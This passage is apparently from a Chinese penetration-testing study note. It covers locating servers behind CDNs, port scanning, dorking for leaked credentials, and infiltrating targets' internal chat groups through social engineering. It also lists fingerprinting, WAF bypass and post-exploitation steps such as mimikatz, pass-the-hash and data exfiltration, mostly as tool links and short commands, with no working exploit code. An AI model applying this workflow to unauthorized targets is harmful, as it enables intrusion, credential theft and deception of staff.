，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。</p></blockquote><ul><li>RSS 订阅</li><li>邮箱注册、激活处</li><li>邮箱找回密码处</li><li>产品更新的邮件推送</li><li>某业务执行后发送的邮件通知</li><li>员工邮箱、邮件管理平台等入口处的忘记密码</li></ul><h5 id="virtual-host-碰撞"><a href="#virtual-host-碰撞" class="headerlink" title="virtual-host 碰撞"></a>virtual-host 碰撞</h5><p>原理：<a href="https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg">https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg</a></p><ul><li>当我们收集了目标足够多的可能的真实 IP 时，可以通过 IP 和子域的碰撞，来批量获得命中目标以及目标哪些的子域。</li><li>在线收集工具 <a href="https://pentest-tools.com/information-gathering/find-virtual-hosts">https://pentest-tools.com/information-gathering/find-virtual-hosts</a></li></ul><h5 id="空间测绘引擎"><a href="#空间测绘引擎" class="headerlink" title="空间测绘引擎"></a>空间测绘引擎</h5><ul><li><p>favicon.ico 哈希特征</p></li><li><p>网页源码特征值</p><blockquote><p>在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。</p></blockquote></li></ul><h4 id="真实-IP-使用"><a href="#真实-IP-使用" class="headerlink" title="真实 IP 使用"></a>真实 IP 使用</h4><p>在获取到真实IP后，通过直接访问IP可能无法访问</p><ul><li><p>修改 hosts 文件</p></li><li><p>burpsuite 测试</p><p><img src="/../images/image-20230510181257028-1685533751888.png" alt="image-20230510181257028"></p></li></ul><h3 id="C段及端口扫描"><a href="#C段及端口扫描" class="headerlink" title="C段及端口扫描"></a>C段及端口扫描</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">masscan</span><br><span class="line">fscan </span><br><span class="line">fscan结果处理：</span><br><span class="line">https://github.com/ZororoZ/fscanOutput</span><br><span class="line"></span><br><span class="line">TXPortMap</span><br></pre></td></tr></table></figure><h4 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h4><p><a href="http://zhuabapa.top/2020/06/03/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">‘常用端口利用总结’ | zer0_c|imb’s blog</a></p><h1 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h1><h2 id="为什么-1"><a href="#为什么-1" class="headerlink" title="为什么"></a>为什么</h2><ul><li><p>运气好，一步到位</p></li><li><p>制作有针对性的弱口令字典</p></li><li><p>🎣</p></li></ul><h2 id="搜索引擎-1"><a href="#搜索引擎-1" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><ul><li><p>针对信息泄露的在线网站</p><ul><li><p><a href="https://leakix.net/">LeakIX</a></p></li><li><p><a href="https://intelx.io/">https://intelx.io/</a></p></li><li><p><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p></li><li><p><a href="https://aleph.occrp.org/">https://aleph.occrp.org/</a></p></li><li><p><a href="https://dehashed.com/">https://dehashed.com/</a></p></li></ul></li><li><p><code>Google Hacking</code></p><ul><li><p>常用语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com  账号 | 密码 | 工号 | 学号 | 身份证 | 公示 | 邮箱</span><br></pre></td></tr></table></figure></li><li><p>工具</p><p><a href="https://github.com/dwisiswant0/go-dork">https://github.com/dwisiswant0/go-dork</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\go-dork.exe -q &quot;[语法]&quot; -p [页面数量] -x http://127.0.0.1:33210 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一页10个数据</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-e 指定引擎 测试了只有google可以</span><br><span class="line">Google, Shodan, Bing, Duck, Yahoo, Ask</span><br></pre></td></tr></table></figure><p>​<img src="/../images/image-20230510222146978-1685533751888.png" alt="image-20230510222146978"></p></li></ul></li></ul><p>​</p><ul><li><p>网站</p><p><a href="https://ght.se7ensec.cn/#">在线Google Hacking小工具</a></p><p><img src="/../images/image-20230509215656848-1685533751889.png" alt="image-20230509215656848"></p><p><a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon</a></p><p><img src="/../images/image-20230509151606375-1685533751889.png" alt="image-20230509151606375"></p></li></ul><h2 id="目录-x2F-文件扫描"><a href="#目录-x2F-文件扫描" class="headerlink" title="目录&#x2F;文件扫描"></a>目录&#x2F;文件扫描</h2><p><strong>取决于字典，需要积累字典</strong></p><ul><li><p>工具</p><ul><li><p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -c -w /path/to/wordlist -u https://target/FUZZ</span><br></pre></td></tr></table></figure><blockquote><p>在需要测试的地方加上FUZZ</p></blockquote></li><li><p><a href="https://github.com/lemonlove7/dirsearch_bypass403">https://github.com/lemonlove7/dirsearch_bypass403</a></p><blockquote><p>流程：dirsearch进行目录扫描—&gt;将所有403状态的目录进行保存–&gt;是否进行jsfind–&gt;是(进行js爬取url和域名，将爬取到的url进行状态码识别如果是403状态则进行保存)–&gt;进行403绕过 （不过jsfinder不建议使用，不如urlfinder好用）</p></blockquote></li><li><p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p><blockquote><p><strong>BBScan</strong> 是一个高并发、轻量级的信息泄露扫描工具。</p></blockquote></li><li><p><a href="https://blog.csdn.net/qq_43427482/article/details/110008286">https://blog.csdn.net/qq_43427482/article/details/110008286</a></p><blockquote><p>敏感文件</p></blockquote></li></ul></li><li><p>字典</p><p>将工具内置字典和公开字典进行整合，然后自己在实际中遇到的再添加。</p></li></ul><h2 id="JS信息"><a href="#JS信息" class="headerlink" title="JS信息"></a>JS信息</h2><p>可能泄露接口，后台地址，密码等敏感信息</p><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><ul><li><p>工具</p><p><code>Urlfinder</code>  （推荐）</p><p><code>JSfinder</code></p><p><a href="https://github.com/mickeystone/JSFinderPlus">https://github.com/mickeystone/JSFinderPlus</a></p></li><li><p>浏览器插件</p><p>熊猫头–<code>FindSomething</code></p></li></ul><h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h3><p><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><h2 id="代码托管平台"><a href="#代码托管平台" class="headerlink" title="代码托管平台"></a>代码托管平台</h2><ul><li><p>github</p><p>工具</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/damit5/gitdorks_go</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./gitdorks_go_amd_linux -gd ../Dorks/smalldorks.txt -nws 20 -target gm7.org -tf ../tokenFile/tf.txt -ew 3</span><br></pre></td></tr></table></figure><blockquote><p><code>./tokenFile/tf.txt</code> → <code>Github access token</code></p><p><code>../Dorks/smalldorks.txt</code> →  <code>关键字字典</code></p></blockquote></li><li><p>GitLab: <a href="https://about.gitlab.com/">https://about.gitlab.com/</a></p></li><li><p>gitee: <a href="https://gitee.com/">https://gitee.com/</a></p></li></ul><h2 id="网盘信息"><a href="#网盘信息" class="headerlink" title="网盘信息"></a>网盘信息</h2><p>聚合网站：<a href="https://www.chaonengsou.com/">超能搜 - 百度网盘搜索神器</a></p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><blockquote><p>从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使 ]</p></blockquote><h2 id="技术文档-x2F-wiki-x2F-知识库"><a href="#技术文档-x2F-wiki-x2F-知识库" class="headerlink" title="技术文档 &#x2F; wiki &#x2F;知识库"></a>技术文档 &#x2F; wiki &#x2F;知识库</h2><p>目标自己对外提供的各种文档里泄露的各种账号密码及其它敏感信息</p><ul><li><p>官网</p></li><li><p><a href="https://www.yuque.com/dashboard">工作台 · 语雀</a></p></li><li><p>百度文库：<a href="https://wenku.baidu.com/">https://wenku.baidu.com</a></p><p>原创力文档：<a href="https://max.book118.com/">https://max.book118.com</a></p><p>凌风云：<a href="https://wenku.lingfengyun.com/">https://wenku.lingfengyun.com</a></p></li></ul><h2 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h2><h3 id="打入目标内部"><a href="#打入目标内部" class="headerlink" title="打入目标内部"></a>打入目标内部</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加入内部QQ群 / 微信群 / 钉钉群 等</span><br><span class="line">社工内部人员</span><br></pre></td></tr></table></figure><h3 id="个人信息使用"><a href="#个人信息使用" class="headerlink" title="个人信息使用"></a>个人信息使用</h3><ul><li><p>将前面收集到的姓名，邮箱，手机号等个人信息放入社工库查询</p></li><li><p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><blockquote><p>通过搜索引擎、PGP服务器以及SHODAN数据库收集用户的email，子域名，主机，雇员名，开放端口和banner信息。</p></blockquote></li><li><p>生成社工字典，进行口令爆破</p><p><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p></li></ul><h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><h2 id="为什么-2"><a href="#为什么-2" class="headerlink" title="为什么"></a>为什么</h2><ul><li><p><strong>筛选出最可能有漏洞的点</strong></p></li><li><p><strong>识别waf</strong></p></li></ul><h2 id="指纹识别-1"><a href="#指纹识别-1" class="headerlink" title="指纹识别"></a>指纹识别</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h3 id="Web应用框架"><a href="#Web应用框架" class="headerlink" title="Web应用框架"></a>Web应用框架</h3><h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><ul><li><p><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p><p><img src="/../images/image-20230511175807888-1685533751889.png" alt="image-20230511175807888"></p></li><li><p><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> </p><p><img src="/../images/image-20230510175457574-1685533751889.png" alt="image-20230510175457574"></p></li><li><p><a href="https://github.com/broken5/bscan">https://github.com/broken5/bscan</a></p><p><img src="/../images/image-20230510175516456-1685533751889.png" alt="image-20230510175516456"></p></li><li><p><a href="https://github.com/EASY233/Finger">https://github.com/EASY233/Finger</a></p><p><img src="/../images/image-20230510175534390-1685533751889.png" alt="image-20230510175534390"></p></li><li><p><a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p><img src="/../images/image-20230511110926338-1685533751889.png" alt="image-20230511110926338"></p></li></ul><h4 id="在线网站-1"><a href="#在线网站-1" class="headerlink" title="在线网站"></a>在线网站</h4><ul><li><p><a href="https://fp.shuziguanxing.com/#/">指纹收录平台</a></p></li><li><p><a href="https://hackertarget.com/whatweb-scan/">https://hackertarget.com/whatweb-scan/</a></p></li><li><p><a href="http://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台 - 云悉安全平台</a>（要企业注册）</p></li></ul><h4 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h4><p>Wappalyzer</p><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><ul><li><p>查看返回包有无WAF字样</p><p><img src="/../images/image-20230511233014884-1685533751889.png" alt="image-20230511233014884"></p></li><li><p><a href="https://github.com/EnableSecurity/wafw00f">WAFW00F </a></p></li><li><p>查看拦截页面信息</p><blockquote><p>通过一些明显的注入来触发waf</p></blockquote><p><a href="https://cloud.tencent.com/developer/beta/article/1872310">83个Waf拦截页面-腾讯云开发者社区-腾讯云</a>  （5年前）</p><p><a href="https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ">30几款常见WAF的拦截页整理</a>   （2021年）</p></li></ul><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3><h1 id="漏洞探测与利用"><a href="#漏洞探测与利用" class="headerlink" title="漏洞探测与利用"></a>漏洞探测与利用</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>经过信息收集得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web服务 （架构，中间件，目录结构）</span><br><span class="line">端口服务</span><br><span class="line">敏感信息 （敏感文件，社工信息）</span><br><span class="line">重点攻击对象</span><br><span class="line">站点是否存在waf</span><br></pre></td></tr></table></figure><p>接下来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏扫</span><br><span class="line">手工</span><br><span class="line">绕waf</span><br><span class="line">代码审计</span><br></pre></td></tr></table></figure><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统漏洞 </span><br><span class="line">web漏洞 </span><br><span class="line">中间件漏洞 </span><br><span class="line">端口服务漏洞 </span><br><span class="line">业务逻辑漏洞</span><br><span class="line">通信安全</span><br></pre></td></tr></table></figure><p>可以参照漏洞checklist来进行检测。</p><p><strong>红队：重点关注能<code>getshell</code>的漏洞</strong></p><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><ul><li><p>CTF知识</p></li><li><p><a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据</a></p></li><li><p>waf绕过学习</p></li></ul><h1 id="待做"><a href="#待做" class="headerlink" title="待做"></a>待做</h1><blockquote><p>把上面的几个步骤，工具串起来，行成快速信息收集，快速探测打点，最好写个贯穿流程的工具调用的脚本。</p></blockquote><p>参考：<a href="https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p><h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><p><img src="/../images/image-20230510184801834-1685533751889.png" alt="image-20230510184801834"></p><p>实操过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域信息收集</span><br><span class="line">linux提权</span><br><span class="line">代理穿透（socket5，frp，re_George，proxifer）</span><br><span class="line">文件传输</span><br><span class="line">简单免杀</span><br><span class="line">mimikatz</span><br><span class="line">ipc$（使用，权限问题）</span><br><span class="line">pth哈希传递</span><br><span class="line">msf使用</span><br></pre></td></tr></table></figure><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内网搜集/探测 =&gt;  免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; （跨）平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护</span><br></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/">域渗透一条龙手册</a></p><h1 id="产出报告"><a href="#产出报告" class="headerlink" title="产出报告"></a>产出报告</h1><p><a href="https://www.anquanke.com/post/id/215031#h3-5">如何编写一份专业的渗透测试报告-安全客 - 安全资讯平台</a></p><p><a href="https://github.com/awake1t/HackReport/tree/main/01-%E6%8A%A5%E5%91%8A%E6%A8%A1%E6%9D%BF">HackReport&#x2F;01-报告模板 at main · awake1t&#x2F;HackReport</a></p><p><strong>修复建议–渗透测试修复建议总结.pdf</strong></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.gm7.org/">Introduction </a></p><p><a href="https://gitbook.se7ensec.cn/#duan-kou-sao-miao">在线工具 - 肾透测试中心</a></p><p><a href="https://gitbook.se7ensec.cn/hong-dui-zuo-zhan-shou-ce#liu-cheng-jian-yao-shuo-ming">红队作战手册 - 肾透测试中心</a></p><p><a href="https://github.com/bin-maker/BYPASS-CDN/">https://github.com/bin-maker/BYPASS-CDN/</a></p><p><a href="https://www.secpulse.com/archives/194410.html">https://www.secpulse.com/archives/194410.html</a></p><p><a href="https://wiki.wgpsec.org/knowledge/">狼组安全团队公开知识库</a></p><p><a href="https://www.wangan.com/p/7fy7fy135d85fec8">https://www.wangan.com/p/7fy7fy135d85fec8</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
